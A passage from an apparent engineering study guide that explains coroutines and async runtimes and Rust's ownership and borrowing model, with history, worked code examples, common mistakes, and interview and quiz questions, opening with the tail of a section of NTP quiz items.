quiz: What do the four timestamps T1 to T4 represent, and what does the client compute from them? || T1 is the client's send time, T2 the server's receive time, T3 the server's send time, T4 the client's receive time. The client computes the offset ((T2−T1) + (T3−T4)) / 2 and the delay (T4−T1) − (T3−T2).
Why does NTP prefer samples with the smallest round-trip delay? || The offset error can be at most half the delay, since the unknown asymmetry cannot exceed the round trip. A small delay leaves little room for error and was least disturbed by queuing.
Why does chrony slew small errors instead of just setting the clock? || Setting it can move time backward or skip forward, which breaks timers, logs, time-ordered IDs and leases. Slewing changes the rate by at most 500 ppm, so time stays continuous.
A clock runs 20 ppm fast. How much error builds up in one day, and how long would a 1 second step take to slew away at 500 ppm? || 20 ppm gives 20 µs per second, or 86,400 × 20e-6 ≈ 1.7 seconds per day. A 1 second error takes 1 / 0.0005 = 2,000 seconds (about 33 minutes) to slew away.
Why must you configure at least three or four NTP servers? || With two sources that disagree, the client cannot tell which is wrong. Three or more let the intersection algorithm outvote a faulty server (a falseticker); four allows one to fail and still leave three.

@@ coroutines
value: A server that handles many network connections spends almost all its time waiting: for a database, for a remote API, for a disk. If each request gets its own OS thread, then waiting requests hold a thread each. A thread costs memory (a kernel stack of 16 KB plus a user stack that is often 1 MB or more of reserved address space) and its switches go through the kernel, at roughly 1 to 5 microseconds each. With 10,000 waiting connections that is a lot of memory and scheduler work, and this was called the "C10K problem" around 1999.
A coroutine is a function that can pause in the middle and be resumed later, with all its local variables intact. The programmer writes straight-line code with `await` at each place where the program must wait. The runtime runs the coroutine until it reaches such a point, saves its state, and uses the same OS thread to run another coroutine. When the awaited event completes (a socket becomes readable, a timer fires), the runtime makes the coroutine runnable again. A handful of threads can then serve hundreds of thousands of waiting tasks, because a suspended coroutine costs hundreds of bytes to a few kilobytes and switching costs tens to hundreds of nanoseconds.
This is the programming model behind Go's goroutines, Python's `asyncio`, JavaScript's `async`/`await`, Rust futures, C# tasks, Kotlin coroutines and Java 21 virtual threads, and it is what the event loop above it executes. The layers below supply the parts: threads and context switching show what is being avoided; I/O models (epoll, io_uring) tell the runtime when a wait is over without blocking a thread; the call stack explains what must be saved when a function pauses; finite automata describe how a compiler turns an async function into a state machine; lambda calculus supplies the idea of a continuation (the rest of the computation as a value); and concurrency models place coroutines next to threads, actors and channels.
terms: Coroutine — a function that can suspend itself at chosen points and later resume exactly where it stopped, keeping its local state.
Await point — the place in an async function where it may suspend; the function gives control back to the scheduler until the awaited result is ready.
Stackful coroutine — a coroutine with its own call stack, so it can suspend from any depth of nested calls (goroutines, Java virtual threads, Lua).
Stackless coroutine — a coroutine compiled into a state machine that stores only its own locals, so it can suspend only at its own await points (Rust, C#, Python, JavaScript).
Future / promise — an object that stands for a result that is not ready yet; awaiting it suspends the caller until it completes.
Continuation — "the rest of the program" from a given point, captured as a value that can be called later.
Scheduler — the part of the runtime that picks which ready coroutine runs next on which thread.
Cooperative scheduling — tasks give up the CPU only at their own suspension points; the runtime does not interrupt them.
Blocking call — a call that holds the OS thread until it finishes (sleep, a synchronous socket read, a heavy loop); inside a coroutine runtime it stalls all tasks sharing that thread.
history: Melvin Conway introduced the word "coroutine" in 1958 while designing a COBOL compiler, and published the idea in 1963 ("Design of a Separable Transition-Diagram Compiler"). He wanted a lexer, a parser and a code generator to run as cooperating passes that hand control to each other, each keeping its own state. Donald Knuth later treated coroutines as the general form, and subroutines as the special case that never suspends. Simula 67 had coroutines for simulation, and Modula-2 and Lua kept them.
Mainstream languages mostly dropped them for decades, using threads instead. The interest returned with web-scale servers. Dan Kegel's "The C10K problem" (1999) described why thread-per-connection fails and pushed servers toward event loops (nginx, Node.js in 2009). Event loops with callbacks worked but made code hard to read ("callback hell"). Promises (JavaScript ES2015) helped, and `async`/`await` made the code look sequential again: F# introduced async workflows in 2007, C# 5 added `async`/`await` in 2012, Python added generators-based coroutines (PEP 342 in 2005, `yield from` in 2012, the `asyncio` library in Python 3.4 in 2014) and `async`/`await` in 3.5 (2015), JavaScript in ES2017, and Rust stabilised async/await in version 1.39 (2019).
A second line took the stackful path. Go shipped goroutines in 2009–2012, with a scheduler that multiplexes them over OS threads (a design by Dmitry Vyukov, Go 1.1, 2013). Erlang had lightweight processes since the 1980s. Project Loom brought the same idea to Java: virtual threads were previewed in Java 19 and 20 and became final in Java 21 (JEP 444, September 2023). Bob Nystrom's essay "What Color is Your Function?" (2015) named the main cost of the stackless style, discussed below.
how: There are two ways to implement a pause. Both rely on the call stack (the L3 concept of frames holding locals and return addresses): a normal function cannot pause because its frame is destroyed when it returns, so a coroutine needs a frame that survives.
Stackless (compiler-generated state machines). The compiler splits an async function at every `await` and builds an object that holds the function's local variables plus a small integer, the current state. The function body becomes a `resume` method: it jumps to the code for the current state, runs until the next `await`, stores the live locals and the new state number in the object, and returns to the caller. This is a finite automaton in the literal sense: the states are the await points. The object is the coroutine's only memory (a few tens to hundreds of bytes), and it runs on whatever thread calls `resume`. Rust compiles `async fn` into an anonymous type that implements the `Future` trait with a `poll` method; C# and JavaScript do something similar; Python builds a coroutine object around a generator frame.
Stackful (own stack, switch by swapping registers). The runtime allocates a small separate stack for each coroutine (a goroutine starts with about 2 KB and grows by copying the stack when needed; a Java virtual thread keeps its frames on the heap while parked and copies them onto a carrier thread's stack when it runs). To switch, the runtime saves the few registers that the calling convention says must survive (stack pointer, frame pointer, instruction pointer and the callee-saved registers, about 6 to 8 words) and loads the target's. No system call and no kernel scheduler are needed, so a switch costs on the order of 100 to 200 nanoseconds in Go. Because the whole stack is saved, the coroutine can suspend from any depth, inside any ordinary library function, so there is no special `async` keyword.
Now the waiting. When a coroutine would block on I/O, the runtime does not block the OS thread. It issues a non-blocking operation, registers interest with the operating system's readiness mechanism (`epoll` on Linux, `kqueue` on BSD and macOS, completion ports on Windows, or `io_uring`, the I/O models concept), and parks the coroutine. One or a few threads run a loop that waits in `epoll_wait` for events, and each event identifies a parked coroutine, which is then put on a run queue. In a stackless runtime, the future the coroutine awaits holds a "waker"; when the socket is readable, the event loop calls the waker, which schedules the coroutine's next `poll`. In Go, the netpoller does this inside the runtime, and the goroutine's code looks like ordinary blocking `conn.Read`.
The scheduler decides where tasks run. A single-threaded loop (Python `asyncio`, Node.js) runs everything on one thread: no data races between tasks, but also no use of more than one core. Multi-threaded schedulers (Go, Tokio in Rust, Java virtual threads on a ForkJoinPool of carrier threads, one per core by default) use work stealing: each worker thread has its own run queue, and an idle worker takes tasks from a busy worker's queue. This is the M:N model: M coroutines on N threads. The context switching concept explains why this is cheaper than N:N: the expensive parts of a thread switch (kernel entry, scheduler decision, TLB and cache effects from switching address-space contexts, a large register state) are mostly not paid.
Semantically, `await` is a continuation. The code after `await x` is "the rest of the computation", and the compiler captures it as a callback that receives the result of `x`. A callback-style program does this by hand; `async`/`await` is the compiler doing the transformation (known as continuation-passing style in lambda calculus) so that the program still reads top to bottom. Errors fit naturally: an exception raised in the awaited operation is rethrown at the `await`, so `try`/`catch` works across suspension.
Scheduling is cooperative, and this is the key cost. A coroutine yields only at an await point. A coroutine that runs a 200 ms loop, or calls a blocking library function, holds its thread for that long, and every other task on that thread is delayed. Go avoids this for goroutines since Go 1.14 (2020) by sending a signal to preempt a goroutine that runs too long; Python and JavaScript do not.

example: A web service receives requests and for each one calls a backend that answers in 50 ms. The service sees 20,000 requests per second. By Little's law (the queueing concept), the number of requests in flight is arrival rate times time in system: 20,000 × 0.05 s = 1,000 requests waiting at any moment.
Thread-per-request with a pool of 200 threads can serve at most 200 / 0.05 = 4,000 requests per second, because each thread is held for 50 ms. To reach 20,000 per second you would need 1,000 threads. That is feasible but heavy: if each reserves a 1 MB stack, that is 1 GB of address space and 16 MB of kernel stacks, plus the scheduler load of 1,000 runnable threads. At 200,000 requests per second (10,000 in flight) it becomes a real problem.
With coroutines, 10,000 in-flight requests are 10,000 small objects. At about 2 KB each that is 20 MB. The runtime needs only a few threads (one per core) to run them, because a coroutine uses a thread only while it executes code, which is perhaps 100 microseconds per request. The same eight cores can handle many times more waiting requests.
Here is the Python shape of such a handler, with a limit on how many calls go to the backend at once:
```python
import asyncio, aiohttp

sem = asyncio.Semaphore(500)      # at most 500 calls in flight

async def fetch(session, url):
    async with sem:               # waits here if 500 are active
        async with session.get(url) as r:    # suspension point
            return await r.json()            # suspension point

async def main(urls):
    async with aiohttp.ClientSession() as s:
        async with asyncio.TaskGroup() as tg:        # Python 3.11+
            tasks = [tg.create_task(fetch(s, u)) for u in urls]
    return [t.result() for t in tasks]
```
Each `await` is a place where `fetch` may be parked. If the first call takes 50 ms, the loop runs 499 other fetches during that time. If someone adds `time.sleep(1)` or a 300 ms JSON parse of a huge document inside `fetch`, the entire loop freezes for that time, and every other request sees extra latency. The fix is `await asyncio.to_thread(parse, data)` or a process pool for CPU-bound work.
intuition: A coroutine is a bookmark in a book: you stop reading, someone else uses the table, and you continue from the exact line when the page you were waiting for arrives.
The design is natural because waiting is the common case in servers and a waiting program needs almost no resources: only its place in the code and its local variables. A thread stores far more than that because it was designed for the general case, where the kernel may stop it at any instruction. A coroutine says in advance where it might stop, so the compiler or runtime saves only what is live at that point. You give up preemption (the kernel can no longer rescue you from a task that does not yield), and in return you get cheap tasks and the ability to reason about where interleaving can happen: only at the awaits.
mistakes: People often think async code runs in parallel. In fact `async`/`await` gives concurrency (many tasks in progress), not parallelism (many running at the same instant). On a single-threaded loop only one task runs at a time. It speeds up I/O-bound work by overlapping waits; it does nothing for a CPU-bound loop, which needs processes or multiple threads.
People often think coroutines are faster than threads for everything. In fact the gain is in memory and switch cost when there are very many mostly-waiting tasks. For a few dozen threads doing real computation, threads are just as fast, and simpler to profile. Async also adds overhead on each await and can make stack traces and debugging harder.
People often think marking a function `async` makes it non-blocking. In fact `async` only allows `await` inside it. If the function calls a blocking library (a synchronous database driver, `requests.get`, `time.sleep`), it still blocks the thread, and now blocks the whole event loop too. Every I/O call on the path must use an async library or be moved to a worker thread.
People often think virtual threads or goroutines remove the need for limits. In fact they remove the thread cost but not the limit of the resource behind them. A million goroutines can still open a million connections to your database and break it. Use semaphores, pools or bounded queues to cap concurrency at the downstream.
friction: Function colouring is the best-known cost of stackless async. An `async` function can only be awaited from another `async` function, so one async call forces its callers, and their callers, to become async. Libraries must be written twice (sync and async), and mixing the two worlds needs bridges that can deadlock. Stackful designs (Go, Java virtual threads) avoid this, because any function can block and the runtime handles it. The price is more memory per task, and a runtime that must be able to save arbitrary stacks.
Cancellation and lifetime are hard. If a request is abandoned, its child tasks should stop and release connections, but tasks started with "fire and forget" calls can leak and keep running. Structured concurrency addresses this: a task scope (Python `TaskGroup`, Trio nurseries, Kotlin `coroutineScope`, Java's `StructuredTaskScope`) does not exit until all children finish or are cancelled. Without it, errors in background tasks vanish.
Hidden blocking is a constant risk. One call to a blocking function, a long CPU loop, a synchronous logging call or a DNS lookup that uses the system resolver can stall an event loop and produce latency spikes that appear only under load. Java virtual threads can also be pinned to their carrier thread: in Java 21 a virtual thread that blocks inside a `synchronized` block holds the carrier thread, which was largely fixed in Java 24. Native calls still pin.
Debugging and observability are harder. A stack trace of a suspended task does not show who started it, profilers must understand tasks, and tools like thread dumps show little. In Rust, async adds further complexity: pinning, futures that are not `Send`, and large compiler-generated futures that can reach kilobytes if many locals live across an await.
practice: Choose by workload. For I/O-bound services with many concurrent connections (API gateways, proxies, crawlers, fan-out services), use coroutines: Go goroutines, Java 21 virtual threads, or `asyncio`/FastAPI in Python. For CPU-bound work, use threads or processes sized to the number of cores; keep them out of the event loop.
Put a limit on everything. Use a semaphore or a bounded worker pool for each downstream (database, HTTP service), and set timeouts on every await on the network. Propagate cancellation: a request that was cancelled by the client should cancel its children (Go `context.Context`, Python task cancellation, Kotlin job hierarchy).
Keep the loop clean. In Python, run blocking or CPU-heavy calls with `asyncio.to_thread` or `run_in_executor`; turn on asyncio debug mode (`PYTHONASYNCIODEBUG=1`), which logs callbacks that run for more than 100 ms. In Node.js, watch event-loop lag as a metric. In Java 21, replace pooled thread-per-request with `Executors.newVirtualThreadPerTaskExecutor()`, and do not pool virtual threads: create one per task. Check for pinning with `-Djdk.tracePinnedThreads`.
Measure the right thing: number of in-flight tasks, scheduler or loop lag, run-queue length, and per-downstream concurrency. If latency rises while CPU is low, tasks are probably waiting on a saturated downstream or a blocked loop.
tradeoffs: Stackless (async/await) versus stackful (goroutines, virtual threads). Choose stackless when you need very small task state, no runtime beyond a library, or predictable memory (Rust, embedded, game loops, JavaScript). Choose stackful when you want ordinary blocking-style code in a large codebase and a library ecosystem that does not need to be rewritten. You pay with colouring in the first and with a heavier runtime and larger task stacks in the second.
Coroutines versus threads. Choose coroutines when you have thousands or more of tasks that mostly wait. Choose OS threads for a small number of CPU-heavy tasks, for code that calls blocking native libraries, or when you need preemption so that one misbehaving task cannot freeze others. You give up simple profiling with coroutines; you give up memory and scale with threads.
Single-threaded loop versus multi-threaded scheduler. Choose a single-threaded loop (Node.js, asyncio) when you want no data races and can scale by running several processes. Choose a work-stealing scheduler (Go, Tokio) when one process must use all cores and share memory. You then need locks or channels for shared state.
Callbacks, futures or async/await. Choose async/await for sequential logic with errors and loops. Choose explicit futures or reactive streams when you need to build the graph of operations dynamically, apply back-pressure per stage, or compose many sources. The cost is code that is harder to read and debug.
interview: Explain what the compiler does to an async function and why a suspended coroutine is so cheap. || It splits the function at each await into states and generates an object holding the live locals plus a state number; resuming jumps to the saved state. There is no separate stack, only that object, so a suspended task costs bytes to a few KB, and switching is a function call instead of a kernel context switch.
Your Python async service has fine average latency but p99 spikes every few seconds while CPU is low. What do you look for? || Something is blocking the event loop: a synchronous call (DB driver, `requests`, logging, DNS), a large JSON parse or other CPU work in a handler, or GC pauses. Use asyncio debug mode to find slow callbacks, measure loop lag, and move blocking work to threads or processes.
What is function colouring, and how do goroutines avoid it? || In stackless async, async functions can be called only from async contexts, so the keyword spreads through the call graph and splits libraries into two versions. Goroutines have their own stacks and the runtime parks them inside the blocking call itself, so any function may block and callers do not change.
You switch a Java service to virtual threads and throughput does not improve. Why? || Possible causes: the work is CPU-bound, so threads were not the limit; a downstream (connection pool, rate limit) is the bottleneck; virtual threads are pinned by `synchronized` blocks or native calls (Java 21); or the code still uses a small fixed pool. Check pinning events, pool sizes and where time is spent.
How do you stop a million coroutines from overwhelming a database? || Limit concurrency at the resource: a semaphore, a bounded connection pool, or a bounded queue between stages that gives back-pressure. Add per-call timeouts and cancel children when the parent fails. Cheap tasks make it easy to create unlimited load, so the limit must be explicit.
How does the runtime know that a socket read can resume a parked coroutine? || It registers the socket with epoll, kqueue or io_uring in non-blocking mode and parks the task. A poller thread waits for readiness events; each event names a descriptor mapped to a waker or goroutine, which is moved to a run queue and continues the read.
quiz: What is the difference between a stackful and a stackless coroutine? || A stackful coroutine has its own call stack and can suspend from any nested call (goroutines, virtual threads). A stackless one is compiled to a state machine holding only its own locals and can suspend only at its own await points (Rust, C#, Python, JavaScript).
Why does one blocking call inside an asyncio handler slow down unrelated requests? || Scheduling is cooperative and all tasks share the loop's single thread. A blocking call holds the thread without yielding, so no other task can run until it returns.
Why can a coroutine switch be about 10 times cheaper than a thread switch? || It runs in user space: it saves a few registers and swaps the stack pointer, or just returns from a state-machine method. A thread switch enters the kernel, runs the scheduler, and may change address-space context and lose cache and TLB state.
A service gets 5,000 requests per second and each waits 200 ms on a backend. How many requests are in flight, and how many threads would thread-per-request need? || By Little's law, 5,000 × 0.2 = 1,000 in flight, so about 1,000 threads would be needed, each blocked 200 ms. Coroutines handle the same load with 1,000 small objects on a few threads.
When is async the wrong choice? || When work is mostly CPU-bound, when the code depends on blocking libraries with no async version, or when the number of concurrent tasks is small. In those cases threads or processes are simpler and equally fast.

@@ ownership
value: Programs that manage memory by hand (C, C++) are fast but they have a whole family of bugs: use after free, double free, dangling pointers, iterator invalidation and data races. These are not rare. Microsoft and the Chromium project each reported that roughly 70% of their serious security bugs were memory-safety errors, and Google reported that the share of memory-safety bugs among new Android vulnerabilities fell from 76% in 2019 to 24% in 2024 as new code moved to memory-safe languages such as Rust. The usual cure is a garbage collector, which frees memory automatically, but it costs run-time work, pauses and memory overhead, and it does not manage files, sockets or locks.
Ownership and borrowing is a third answer, used by Rust. The compiler tracks, for every value, which variable owns it, and enforces a few rules at compile time: each value has exactly one owner; when the owner goes out of scope the value is freed; references to a value may be shared and read-only, or single and writable, but never both at once; and a reference may never outlive the value it points to. A program that breaks a rule does not compile. A program that compiles cannot contain use-after-free, double free, or a data race, and it pays nothing at run time for the checks.
This idea needs the layers below. The type system (L3) is the machinery: ownership and reference kinds are part of a value's type, and the checker is a type checker. Memory-safety bugs and control hijacking (L3) define what must be ruled out. Garbage collection (L3) is the alternative that ownership avoids, and the comparison explains the trade. Type theory (L4) supplies the theory: ownership is an application of affine types, where a value may be used at most once, from substructural logic. Above it, Rust the language and the study of language runtimes treat ownership as a third memory-management strategy, next to manual and garbage-collected.
terms: Owner — the single variable (or field) responsible for a value; when it goes out of scope the value is dropped.
Move — transferring ownership from one variable to another; the old variable can no longer be used.
Drop — running a value's cleanup code and freeing its memory at the end of the owner's scope; Rust inserts the call at compile time.
Borrow — creating a reference to a value without taking ownership; the owner keeps responsibility for freeing it.
Shared reference (`&T`) — a read-only borrow; any number may exist at the same time.
Mutable reference (`&mut T`) — a read-write borrow; only one may exist, and no shared reference may exist alongside it.
Lifetime — the region of the program during which a reference is valid; the compiler checks that a reference's lifetime fits inside the lifetime of the value it points to.
Affine type — a type whose values may be used at most once; moving a value uses it up.
Aliasing — two or more references to the same memory at the same time; the root of many bugs when combined with mutation.
history: The idea comes from logic and from practical C++. Jean-Yves Girard introduced linear logic in 1987, where each hypothesis must be used exactly once, and Philip Wadler's 1990 paper "Linear types can change the world!" argued that such types let a functional program update data in place safely. Languages such as Clean (uniqueness types) and Cyclone (a safer C from AT&T and Cornell, with region-based memory, around 2001–2002) explored the same ground. C++ added RAII (resource acquisition is initialisation, Bjarne Stroustrup, 1980s), where destructors free resources at the end of scope, and `unique_ptr` in C++11 (2011), which can be moved but not copied. Rust takes RAII and makes the compiler enforce it.
Graydon Hoare began Rust as a personal project in 2006; Mozilla sponsored it from 2009, because Firefox's rendering engine, written in C++, kept having memory-safety bugs. Early Rust had garbage-collected pointers and many pointer kinds. Over 2012 to 2014 the team removed them and settled on ownership and borrowing as the core idea. Rust 1.0 was released in May 2015.
The rules have become less strict to write but not weaker. Before 2018, borrows lasted until the end of the enclosing block, and programmers had to add extra braces; "non-lexical lifetimes" (stable in the 2018 edition, Rust 1.31 in December 2018) end a borrow at its last use. A formal proof followed: RustBelt (Jung, Jourdan, Krebbers and Dreyer, POPL 2018) proved the soundness of a core of Rust's type system, including some `unsafe` library code, in the Iris logic. Adoption grew: Rust entered the Linux kernel in version 6.1 (December 2022), and Android, Windows and Chromium now contain Rust components. Other languages followed with variants: Swift 5.9 added ownership modifiers (`borrowing`, `consuming`).
how: Start with a single rule: every value has one owner. When you write `let a = String::from("hi");`, the string's 24 bytes (a pointer, a capacity and a length) live in the variable `a`, and the text lives in a heap buffer. At the closing brace of the scope where `a` was declared, the compiler inserts a call to the value's `drop`, which frees the buffer. This is deterministic and costs the same as a hand-written `free`, but the compiler writes the call, so you cannot forget it, and cannot write it twice.
Moves make this safe when values travel. `let b = a;` does not copy the heap buffer. It copies the 24 bytes and marks `a` as moved-from, so the compiler will refuse any later use of `a`. Because only `b` is now responsible for dropping, the double free of C cannot occur. Passing a value to a function also moves it. A type that is just plain bits (integers, floats, `bool`, and tuples or structs of such types, if marked `Copy`) is copied instead, because no cleanup is needed. If you want a real duplicate of a heap value, you call `.clone()`, which makes the cost visible.
Moving everything would be unusable, so there are borrows. `&x` makes a shared reference and `&mut x` a mutable one. The core rule is: at any point, a value has either any number of shared references, or exactly one mutable reference. This is "aliasing XOR mutation". It is the heart of the safety argument. Almost every memory bug needs both aliasing and mutation: a pointer into a buffer, plus someone who changes the buffer (grows it, frees it, overwrites it) while the pointer is still in use. If the compiler forbids having both at once, the bug class cannot be written. The same rule also removes data races in threads, because a data race is exactly two threads touching the same memory with at least one writing, without synchronisation.
Lifetimes make the second rule checkable: a reference must not outlive its value. The compiler gives every reference a lifetime, which is the set of program points where the reference may still be used. It computes this over the control-flow graph (the automata-like graph of statements), using a data-flow analysis: a borrow is live from its creation to its last possible use. A borrow conflicts with any action that would break the rules during that span, such as a move, a write, or a second `&mut`. When a function returns a reference, the signature must say which input it comes from: `fn longest<'a>(x: &'a str, y: &'a str) -> &'a str` says the result lives no longer than both inputs. In most cases the compiler infers these ("lifetime elision"), and you write them only when it cannot.
Here the type system does the work. The reference kinds `&T` and `&mut T` are types, lifetimes are type parameters, and the borrow checker is a check on the typed intermediate form of the program (called MIR) after type inference. Affine types explain why moves behave this way: a variable holding an owned value can be consumed at most once, so using it a second time is a type error. Rust is "affine" and not "linear" because dropping a value without using it is allowed (the compiler runs `drop`).
Shared ownership and mutation through shared access are still possible when needed, but are moved into library types that carry the cost explicitly. `Rc<T>` and `Arc<T>` are reference-counted pointers that give several owners (the last one frees the value); `Arc` uses atomic counters and is safe across threads. `RefCell<T>` and `Mutex<T>` allow mutation through a shared reference, and check the rules at run time (a `RefCell` panics if you break them; a `Mutex` blocks). Across threads, two marker traits, `Send` (safe to move to another thread) and `Sync` (safe to share by reference), are checked by the compiler, so passing a non-thread-safe `Rc` to another thread is a compile error. Inside these library types sits `unsafe` code, written by people who must uphold the rules by hand; the language confines it to marked blocks so that reviewers know where to look.

example: Take the classic bug of keeping a pointer into a growing array. In C++ it looks like this: `int* p = &v[0]; v.push_back(4); print(*p);`. If the vector had capacity 3 and 3 elements, `push_back` allocates a new buffer (say capacity 6), copies the elements, and frees the old buffer. Now `p` points to freed memory. Reading it is undefined behaviour: it may print the old value, garbage, or let an attacker read other data. Compilers accept this code.
The same program in Rust:
```rust
fn main() {
    let mut v = vec![1, 2, 3];
    let first = &v[0];        // shared borrow of v starts
    v.push(4);                // needs &mut v while first is alive
    println!("{first}");      // last use of the shared borrow
}
```
The compiler stops with error E0502: "cannot borrow `v` as mutable because it is also borrowed as immutable". Follow its reasoning with the rules. `&v[0]` creates a shared borrow whose lifetime extends to its last use, the `println!`. `v.push(4)` needs a mutable borrow of `v`, which cannot exist while a shared one is live. Two fixes are natural. Copy the value out first (`let first = v[0];`, an integer copy), so no borrow remains. Or move the `println!` before the `push`, so the shared borrow ends earlier. Both remove the aliasing at the point of mutation. Under non-lexical lifetimes, the second version compiles even though `first` is still in scope, because the borrow is live only up to its last use.
Now a move error:
```rust
let a = String::from("hi");
let b = a;                  // ownership moves to b
println!("{a}");            // error E0382: borrow of moved value: `a`
```
At run time, the move copies 24 bytes, a few nanoseconds. If this were allowed, both `a` and `b` would try to free the same buffer at the end of scope. With the compiler rule, exactly one drop happens. If both names are needed, `let b = a.clone();` makes a second 2-byte buffer (and costs an allocation), or `let b = &a;` borrows it.
Last, a thread: `std::thread::spawn(move || println!("{:?}", v))` moves `v` into the new thread. The original thread can no longer use `v`, so no two threads share it. If you instead tried to share `v` mutably between two threads, the borrow rules (or the missing `Sync` bound) would reject the program at compile time, where in C or Java the race would appear only under load.
intuition: Owning a value is like holding the only key to a room: you may lend the key to many readers, or hand it to one editor, but never both, and the room is closed when the last holder leaves.
The idea is natural because memory bugs are always bugs about who is responsible for a piece of memory, and about who may look at it while somebody else changes it. C leaves both questions in the programmer's head. Garbage collection answers the first at run time by tracking reachability. Ownership answers both questions in the program text, where the compiler can check them. Because each value has one owner, "when to free" is a fixed point in the code. Because mutation excludes aliasing, any reference you hold stays valid and consistent while you use it.
mistakes: People often think the borrow checker works at run time. In fact all of ownership and borrowing is checked during compilation and leaves no trace in the compiled code: a reference is an ordinary pointer, a move is a memcpy (or nothing at all), and drop is a plain call. The only run-time checks are the ones you choose, such as `RefCell`, bounds checks on arrays, and overflow checks in debug builds.
People often think Rust programs cannot have memory errors at all. In fact the guarantee applies to safe Rust. `unsafe` blocks allow raw pointers, and the standard library and many crates use them internally. Bugs in `unsafe` code, or in a compiler (there are known soundness bugs), can still cause memory errors. The point is that the dangerous area is small, marked, and reviewable. Memory leaks are also allowed (for example reference cycles with `Rc`), because leaking is not memory-unsafe.
People often think ownership is just C++ smart pointers. In fact `unique_ptr` is a convention that programmers can break (using a moved-from pointer compiles fine and gives a null pointer), and raw references to the same object are unchecked. Rust makes the use-after-move and the dangling reference compile-time errors, and extends the same checking to references and threads.
People often think fighting the borrow checker means the language is too strict. In fact the errors usually point to a design where two parts of the program share and change the same data without a clear owner, which is also the shape that causes bugs in other languages. The common way out is to restructure: pass indexes instead of pointers, split a struct into parts, or return values instead of holding references.
friction: The learning curve is real. Programmers coming from C++ or Java must learn to think about who owns data, and certain structures are awkward: doubly linked lists, graphs with cycles, trees with parent pointers, and any design with many mutable aliases. The usual solutions (indexes into a `Vec`, an arena allocator, `Rc<RefCell<T>>`, or `unsafe`) are workable but less direct. Self-referential structs (a struct that holds a reference to its own field) are especially hard, and they appear when writing async code, which is why Rust needs `Pin`.
The checker is conservative. It rejects some programs that are actually safe because it cannot prove them; for example, borrowing two different fields of a struct through a method call, or two disjoint elements of a slice with `&mut v[0]` and `&mut v[1]`, needs `split_at_mut` or restructuring. The Polonius project has long worked on a more precise analysis to accept more safe programs.
Lifetimes also leak into APIs. A struct that holds a reference needs a lifetime parameter, and that parameter spreads through every type that contains it. Generic code, traits and async functions can produce long error messages that are hard to read. Compile times in large Rust projects are long, partly because of the work of type and borrow checking and monomorphisation.
Finally, ownership solves memory and data races, not all concurrency bugs. Deadlocks, logic races (such as two checks with a gap between them) and incorrect protocols still happen. Dropping order and panics can also surprise: destructors run in reverse order of declaration, and a panic while holding a lock "poisons" it.
practice: Start by letting the compiler teach you: read each error from top to bottom, because the message names the borrow, the conflicting use and often a suggested fix. Default to passing `&T` for reading, `&mut T` for changing, and owned `T` when the callee must keep or consume the value. Return owned values rather than references when unsure; the copy is usually cheap and the code simpler.
Prefer designs that avoid shared mutable state: pass data into functions, return results, use channels (`std::sync::mpsc`, `crossbeam`) between threads, and keep long-lived data in one owner with short borrows. For graphs and trees with back-pointers, store nodes in a `Vec` and refer to them by index (or use a crate such as `slotmap`). Use `Rc<RefCell<T>>` or `Arc<Mutex<T>>` only where sharing is truly needed, and keep the locked section small.
Use `clone()` deliberately while learning, and remove it later where profiling shows it matters. Avoid reaching for `unsafe` to get around the checker; if you must use it, wrap it in a small safe API, write down the invariant in a comment, and test it under Miri (the Rust interpreter that detects undefined behaviour) and with sanitizers. For teams adopting Rust in a C++ codebase, start with new components or leaf libraries, using FFI at the boundary (C ABI, `cxx`, `bindgen`).
Measure the benefit where it counts: a Rust service typically has the performance of C++ with no GC pauses, so it fits latency-sensitive paths, parsers of untrusted input, and systems code; for ordinary business logic, a garbage-collected language with a mature ecosystem may still be the cheaper choice for the team.
tradeoffs: Ownership versus garbage collection. Choose ownership (Rust) when you need predictable latency with no pauses, small memory footprints, control of when resources are released, or safe code that parses untrusted input. Choose a garbage-collected language (Java, Go, Python) when development speed and library ecosystem matter more, the data structures are graph-like with many shared pointers, and a few milliseconds of GC pause are acceptable. You give up compile-time guarantees with GC, and give up easy sharing with ownership.
Ownership versus manual management with discipline (C, C++). Choose C or C++ when you need an existing codebase, specific tooling or hardware support, or maximum freedom for unusual memory layouts. Choose Rust when the cost of one memory-safety vulnerability is high (browsers, kernels, network parsers) and you can afford a rewrite or a new component. With C++ you rely on code review, sanitizers and fuzzing to find what Rust prevents.
Compile-time borrowing versus run-time checks. Use plain references when the structure of ownership is tree-like and clear: zero cost, caught early. Use `Rc<RefCell<T>>` or `Arc<Mutex<T>>` when sharing is dynamic; you pay a counter update or lock on each access and give up some static guarantees (a `RefCell` violation becomes a panic).
Reference counting versus ownership. `Arc` gives shared ownership without a tracing collector, with deterministic frees, but each clone is an atomic operation (around 5 to 20 ns, more under contention) and cycles leak. Choose single ownership wherever you can, and `Arc` only for data that is truly shared across tasks.
interview: Explain why Rust's rule "many readers or one writer" prevents iterator invalidation and data races. || Both bugs need a reference that sees memory while another path mutates it: a pointer into a vector while it reallocates, or two threads where one writes. If a mutable borrow excludes every other reference for as long as it is live, then no reader can exist during a write, so neither the stale pointer nor the race can be expressed in safe code.
What does a move cost at run time, and what stops a double free? || A move is a shallow copy of the value's bytes (24 bytes for a `String` or `Vec`), often optimised away. The compiler marks the source as invalid, so only the new owner's drop runs. Conditional moves use a hidden drop flag, a one-bit run-time marker.
How would you build a doubly linked list or a graph in Rust, and why is it awkward? || Each node has more than one owner or pointer to it, which conflicts with single ownership. Options: store nodes in a `Vec` and use indices, use an arena with lifetime-bound references, use `Rc`/`Weak` with `RefCell`, or write `unsafe` raw pointers inside a safe wrapper (as the standard library `LinkedList` does).
What is `unsafe` in Rust and what do you promise when you write it? || It unlocks operations the compiler cannot check, such as dereferencing raw pointers and calling foreign functions. You promise to uphold the invariants (valid pointers, no aliasing violations, no data races) yourself; safe code built on your abstraction must not be able to cause undefined behaviour.
Why is Rust better or worse than Go for a low-latency proxy? || Rust has no GC pauses and fine control of memory and copying, so p99.9 latency is more predictable, and the type system catches races. Go gives faster development, simple concurrency with goroutines and a good standard library; its GC pauses are usually under a millisecond but can still affect tail latency under heavy allocation. The decision depends on team skill and latency targets.
How does `Send`/`Sync` interact with ownership? || `Send` means ownership of a type may move to another thread, and `Sync` means `&T` may be shared across threads. The compiler derives them from field types, so an `Rc` (non-atomic counter) is neither, and spawning a thread that captures one fails to compile. This extends memory safety to concurrency without run-time checks.
quiz: State the two core borrowing rules. || A reference must never outlive the value it points to. At any time you may have many shared (`&T`) references or exactly one mutable (`&mut T`) reference, but not both.
Why can't two variables own the same heap value after `let b = a;`? || The assignment moves ownership to `b` and the compiler rejects later use of `a`. This guarantees only one drop, which prevents double free.
